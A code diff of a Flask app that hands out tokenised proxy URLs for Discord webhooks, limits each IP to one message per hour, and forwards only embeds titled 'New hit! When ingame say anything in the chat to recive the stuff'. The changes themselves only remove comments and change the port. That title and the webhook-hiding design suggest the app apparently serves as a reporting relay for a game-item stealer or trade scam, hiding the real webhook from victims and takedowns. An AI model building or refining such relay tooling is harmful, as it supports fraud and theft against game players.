@@ -5,9 +5,9 @@ import requests, time, string, random, os
 app = Flask(__name__)
 CORS(app)
 
-webhook_map = {}  # token -> actual Discord webhook
-ip_registry = {}  # token+IP -> timestamp
-LIMIT_SECONDS = 3600  # 1 message per hour per IP
+webhook_map = {}
+ip_registry = {}
+LIMIT_SECONDS = 3600
 
 def generate_token(length=6):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
@@ -16,14 +16,13 @@ def generate_token(length=6):
 def create_webhook():
     data = request.json
     real_webhook = data.get("real_webhook")
-    
+
     if not real_webhook or "discord.com/api/webhooks/" not in real_webhook:
         return jsonify({"error": "Invalid Discord webhook URL"}), 400
 
     token = generate_token()
     webhook_map[token] = real_webhook
 
-    # Use Render’s external URL or localhost fallback
     base_url = request.host_url.rstrip("/")
     return jsonify({"proxy_url": f"{base_url}/webhook/{token}"})
 
@@ -45,7 +44,6 @@ def handle_webhook(token):
     if not data or "embeds" not in data:
         return jsonify({"error": "Missing 'embeds'"}), 400
 
-    # Validate embed format
     allowed = False
     for embed in data["embeds"]:
         if embed.get("title", "").strip() == "New hit!\nWhen ingame say anything in the chat to recive the stuff":
@@ -68,7 +66,6 @@ def handle_webhook(token):
         "discord_status": response.status_code
     })
 
-# Automatically use the correct port (for Render or local)
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
+    port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
